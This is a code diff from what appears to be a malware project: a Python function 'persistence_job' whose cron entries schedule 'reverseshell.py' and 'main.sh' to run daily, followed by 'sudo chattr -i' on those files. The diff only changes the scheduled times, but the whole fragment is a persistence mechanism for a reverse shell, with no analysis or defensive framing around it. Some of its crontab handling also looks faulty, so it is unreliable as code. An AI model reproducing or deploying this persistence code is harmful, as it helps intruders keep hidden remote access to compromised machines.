@@ -12,18 +12,18 @@ def persistence_job():
         try:
             FILE_CHECK = os.path.exists("reverseshell_self.py")
             if FILE_CHECK == True:
-                run(f"echo '37 13 * * * reverseshell.py' | crontab -e", shell=True)
+                run(f"echo '30 18 * * * reverseshell.py' | crontab -e", shell=True)
                 os.system('sudo chattr -i reverseshell.py')
                 time.sleep(1)
-                run(f"echo '37 13 * * * main.sh' | crontab -e", shell=True)
+                run(f"echo '30 18 * * * main.sh' | crontab -e", shell=True)
                 os.system('sudo chattr -i main.sh')
                 time.sleep(1)
             
         except FileNotFoundError:
-            run(f"echo '01 08 * * * /usr/bin/reverseshell.py' | crontab -e", shell=True)
+            run(f"echo '01 21 * * * /usr/bin/reverseshell.py' | crontab -e", shell=True)
             os.system('sudo chattr -i /usr/bin/reverseshell.py')
             time.sleep(1)
-            run(f"echo '01 08 * * * /usr/bin/main.sh' | crontab -e", shell=True)
+            run(f"echo '01 21 * * * /usr/bin/main.sh' | crontab -e", shell=True)
             os.system('sudo chattr -i /usr/bin/main.sh')
             time.sleep(1)
                 
